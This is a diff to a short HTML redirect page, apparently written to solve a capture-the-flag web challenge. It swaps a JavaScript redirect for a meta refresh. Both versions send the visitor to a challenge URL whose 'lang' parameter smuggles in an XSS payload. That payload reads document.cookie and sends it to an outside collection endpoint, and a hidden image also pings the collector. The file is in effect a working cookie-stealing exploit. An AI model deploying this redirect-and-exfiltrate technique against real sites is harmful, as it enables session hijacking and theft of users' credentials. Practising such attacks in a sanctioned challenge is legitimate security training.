@@ -2,18 +2,10 @@
 <html>
 <head>
     <title>Test</title>
-    <script>
-        // Add debugging
-        var img1 = new Image();
-        img1.src = "https://ssrf-eta.vercel.app/api/capture?debug=page_loaded";
-        
-        // Simple redirect to XSS payload
-        setTimeout(function() {
-            window.location.href = "http://chal1.lagncra.sh:8426/?lang=en%22%3Bvar%20img%3Dnew%20Image()%3Bimg.src%3D%22https%3A//ssrf-eta.vercel.app/api/capture%3Fcookies%3D%22%2Bdocument.cookie%3B//";
-        }, 1000);
-    </script>
+    <meta http-equiv="refresh" content="1; url=http://chal1.lagncra.sh:8426/?lang=en%22%3Bvar%20img%3Dnew%20Image()%3Bimg.src%3D%22https%3A//ssrf-eta.vercel.app/api/capture%3Fcookies%3D%22%2Bdocument.cookie%3B//">
 </head>
 <body>
+    <img src="https://ssrf-eta.vercel.app/api/capture?debug=page_loaded" style="display:none;">
     <p>Redirecting...</p>
 </body>
 </html>
